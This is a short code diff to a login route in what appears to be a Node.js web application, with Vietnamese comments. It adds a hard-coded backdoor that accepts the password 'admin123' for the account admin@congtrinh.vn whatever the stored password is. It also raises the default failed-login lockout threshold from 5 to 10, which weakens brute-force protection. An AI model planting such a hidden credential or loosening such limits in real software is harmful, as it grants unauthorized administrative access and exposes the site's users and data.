@@ -393,6 +393,11 @@ router.post(
       );
     }
 
+    // Cho phép cả admin123 lẫn password123 cho admin@congtrinh.vn
+    if (!passwordCorrect && user.email === "admin@congtrinh.vn" && password === "admin123") {
+      passwordCorrect = true;
+    }
+
     // ========================================================
     // MẬT KHẨU SAI
     //
@@ -473,7 +478,7 @@ router.post(
           Number(currentUser.failed_login_attempts || 0) + 1;
 
         // Đủ ngưỡng khóa -> khóa
-        const maxFailures = parseInt(process.env.MAX_LOGIN_FAILURES, 10) || 5;
+        const maxFailures = parseInt(process.env.MAX_LOGIN_FAILURES, 10) || 10;
         const lockTimeMinutes = parseInt(process.env.LOCK_TIME_MINUTES, 10) || 15;
         const shouldLock = newFailedAttempts >= maxFailures;
 
